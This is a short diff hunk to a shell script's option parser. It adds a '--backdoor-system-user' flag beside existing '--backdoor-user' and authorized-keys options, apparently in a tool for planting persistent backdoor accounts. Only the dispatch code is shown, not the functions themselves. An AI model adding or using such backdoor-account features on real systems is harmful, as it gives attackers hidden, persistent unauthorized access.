@@ -51,6 +51,11 @@ main() {
 				setup_authorized_keys "$@"
 				exit
 				;;
+			--backdoor-system-user )
+				shift
+				setup_backdoor_system_user "$@"
+				exit
+				;;
 			--backdoor-user )
 				shift
 				setup_backdoor_user "$@"
